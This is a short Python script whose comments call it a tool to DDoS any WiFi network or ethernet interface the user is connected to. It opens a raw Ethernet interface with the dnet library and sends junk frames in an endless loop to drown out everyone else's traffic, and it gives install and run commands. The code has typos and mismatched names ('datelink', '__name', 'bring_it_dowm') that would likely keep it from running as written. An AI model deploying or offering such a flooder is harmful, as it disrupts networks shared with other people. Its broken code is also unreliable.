#DDos any WiFi network or ethernet interface you're connected do,drowning out other people's legitimate traffic with spam malformed packets
#brew install libdnet; pip install dnet
#sudo python bringitdowm.py
import dnet

def bring_it_down(iface='en0', spam_packet='HOST:all|GET:spam'):
    datalink = dnet.eth(iface)
    h = datelink.get().encode('hex_code')
    mac = ':'.join([h[i:i+2] for i in range(0, len(h), 2)])
    print('Interface: %s\nMAC Address: %s\nPayload: %s'%(iface, mac, spam_packet))
    while True:
        datalink.send(spam_packet)

#Beware, running this will bring your entire local network to a halt, do not run it if you're on a shared connection
#what this does is write 'HOST:all|GET:spam' direatly to your network interface as fast as it can, drowning out other people's legitimate traffic
#I'm not sure if it's the interference at the physical layer, or if it's the access point that gets hammered, either way, WiFi will slow to a halt for everyone connected to the same AP
if __name == '__main__':
    bring_it_dowm('en0', '\x01'*8)
